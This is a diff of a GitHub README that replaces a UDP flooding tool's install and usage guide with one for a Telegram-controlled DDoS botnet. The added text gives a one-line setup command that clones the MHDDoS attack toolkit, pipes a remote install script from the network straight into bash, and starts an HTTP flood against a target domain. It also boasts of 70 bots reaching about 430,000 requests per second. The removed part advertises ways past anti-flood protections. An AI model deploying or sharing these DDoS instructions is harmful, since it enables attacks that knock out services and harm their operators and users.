@@ -1,85 +1,29 @@
-# Notice!
+# DDOS Botnet Sample
 
-This tool does no longer works i removed some important codes on the script now it'll not work, I am retired from making flooding tools.
+DDOS BotNet for telegram, just make differents version of this bot with differents telegram token (in .env file pls).
 
-# UDP Toqster
+And host it ! (I use [GLITCH](https://glitch.com/dashboard) for simple and free host)
+<br><br>
+## How use it ?
 
-A potent UDP flooding tool designed for stress testing network resilience and evaluating security measures.
-
-<div align="center">
-    <h2><p>Warning:</p></h1>
-</div>
-
-```bash
-
-This is for educational purposes only, i am not responsible for any damage you cause, use it at your own risk!
-
-```
-
-<div align="center">
-    <h2> <b>Termux Installation:</b> </h1>
-</div>
-
-```bash
-
-apt update
-apt -y upgrade 
-
-apt install git
-apt install python
-git clone https://github.com/IamToqst/udp-toqster
-cd udp-toqster
+Just clone the repo on your hosting server, make a .env file with a TELEGRAM_TOKEN variable with your telegram token key, 
+and make a NUM variable with the name of the bot.
+<br><br>
+In the shell of your hosting server make this config command : 
+<br>
+` /usr/bin/python3 -m pip install --upgrade pip && pip3 uninstall telegram && pip3 uninstall telegram-bot python-telegram-bot && pip3 install -r requirements.txt &&git clone https://github.com/MatrixTM/MHDDoS.git && cd MHDDoS && pip3 install -r requirements.txt && curl -s https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/scripts/python_git_MHDDoS_proxy_install.sh | bash && python3 ~/MHDDoS/start.py GET example.com 1 100 mhddos_proxy/list 100 5 `
+<br>
+Now hit the URL of the bot for start (only if your hosting sleep your project in free mode like Glitch), you can also make a bot for start all other bot. 
 
 
-```
-<div align="center">
-    <h2> <b>VPS/Linux Installation:</b> </h1>
-</div>
+The installation tutorial is not finished, if you have any problems I can help you.
 
-```bash
+<br><br>
+[+] NEW ! You can now upgrade your requests/s using my [DDOS BOOSTER !](https://github.com/Mehliug-git/DDOS_Booster) It's just a DDOS bot without Telegram, just get a URL and start DDOS !    
+<br>
+[+] NEW ! : If you just want to test your infrastrucutre open me an Issue and have done this together !!
 
-sudo apt update && sudo apt upgrade
+**In my Botnet I have actually 70 bots, I can go up to ~ 430 000 requests /s**
+<br><br>
 
-sudo apt install git
-sudo apt install python
-git clone https://github.com/IamToqst/udp-toqster
-cd udp-toqster
-
-```
-<div align="center">
-    <h2> <b>Usage:</b> </h1>
-</div>
-
-```bash
-python udp-toqster.py
-```
-<div align="center">
-    <h2><p>What's new?</p></h1>
-</div>
-
-```bash
-
-- Bypasses APIs with anti-packets (Minecraft | PMMP | API 2.0.0)
-- Added themes, (Red and White)
-- Lets you adjust the packets to be sent to your target
-- Lets you adjust adjust the threads
-- Fixed all errors on stopping the script (CTRL+C)
-- Added Domain resolver
-- Fixed the hostname issues
-```
-<div align="center">
-    <h2><p>IamToqst Socials:</p></h1>
-</div>
-
-```bash
-
-Socials of IamToqst:
-
-Discord: IamToqst.
-YouTube: https://youtube.com/@IamToqst
-GitHub: https://github.com/IamToqst
-```
-# Language used:
-Programming Languages used:
-
-<img src="https://img.shields.io/badge/Python-14354C?style=for-the-badge&logo=python&logoColor=wh">
+### Just for educational purpose only, Do, what you want I don’t give a fuck, but it’s not my fault you’re in trouble.
